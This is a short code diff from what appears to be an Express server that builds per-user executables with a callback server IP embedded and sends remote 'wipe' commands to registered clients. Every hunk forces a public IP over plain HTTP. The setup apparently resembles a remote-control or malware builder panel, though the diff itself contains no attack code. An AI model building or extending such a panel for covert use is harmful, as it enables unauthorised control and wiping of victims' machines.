@@ -587,8 +587,8 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
 
   let base = req.body?.serverBase;
   if (!base) {
-    // Force HTTP for wipe command too
-    const host = req.headers.host.split(':')[0];
+    // FORCE THE PUBLIC IP INSTEAD OF localhost
+    const host = process.env.SERVER_IP || req.headers.host.split(':')[0];
     base = `http://${host}`;
   }
 
@@ -860,8 +860,8 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
     const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
     
-    // FORCE HTTP TO BYPASS SSL CERTIFICATE ERRORS ON IPs
-    const host = req.headers.host.split(':')[0]; 
+    // FORCE THE PUBLIC IP INSTEAD OF localhost
+    const host = process.env.SERVER_IP || req.headers.host.split(':')[0];
     const serverBase = `http://${host}`;
 
     zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId, serverIp: serverBase });
@@ -1096,7 +1096,7 @@ async function refreshAllBuilds() {
 
         console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
         
-        const host = process.env.SERVER_DOMAIN || 'localhost';
+        const host = process.env.SERVER_IP || 'localhost';
         const serverBase = `http://${host}`;
         
         const exeBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id, serverIp: serverBase });
